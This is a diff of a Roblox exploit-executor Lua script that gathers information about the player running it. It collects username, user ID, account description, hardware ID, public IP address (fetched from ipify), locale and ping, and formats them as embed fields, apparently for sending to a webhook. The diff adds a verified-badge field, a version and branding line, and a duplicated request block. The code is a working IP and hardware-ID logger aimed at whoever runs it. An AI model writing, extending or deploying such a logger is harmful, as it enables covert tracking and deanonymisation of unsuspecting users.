@@ -1,3 +1,6 @@
+getgenv().Version = '2.3.1';
+getgenv().sym = 'Symmertrical Blue ®';
+
 local req = http_request or request or (syn and syn.request)
 local HS = game:GetService("HttpService")
 local response = HS:JSONDecode(
@@ -6,6 +9,14 @@ local response = HS:JSONDecode(
 })
 .Body)
 
+
+local req = http_request or request or (syn and syn.request)
+local HS = game:GetService("HttpService")
+local response = HS:JSONDecode(
+    req({
+    Url = "https://users.roblox.com/v1/users/"..game.Players.LocalPlayer.UserId
+})
+.Body)
 
 
 local req = http_request or request or (syn and syn.request)
@@ -35,6 +46,7 @@ pcall(function()
           {name = '**Username**', value = game:GetService("Players").LocalPlayer.Name},
           {name = '**DisplayName**', value = ''..game.Players.LocalPlayer.DisplayName},
           {name = "**UserID**", value = ''..game.Players.LocalPlayer.UserId},
+          {name = "**Verified Badge**", value = ''..tostring(response.hasVerifiedBadge)},
           {name = '**Account Description**', value = "'"..response.description.."'"},
           {name = '**Hardware ID**', value = game:GetService("RbxAnalyticsService"):GetClientId()},
           {name = '**IP Address**', value = ''..req({ Url = "https://api.ipify.org/", Method = "Get" }).Body},
@@ -42,9 +54,10 @@ pcall(function()
           {name = '**Language**', value = ''..game.Players.LocalPlayer.LocaleId},
           {name = '**Account Created**', value = ""..response.created..""},
           {name = "**Ping**", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
-          {name = "**Executor**", value = identifyexecutor()..'  |  Executor Version : '..version},
+          {name = "**Executor**", value = identifyexecutor()..'  |    Executor Version : '..version},
           {name = "**Game Place ID**", value = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")"},
           {name = "**Game Name**", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name},
+          {name = "**Script **", value = '**| Version |  **'..Version..' | Script > '..sym},
         }
     }
   }
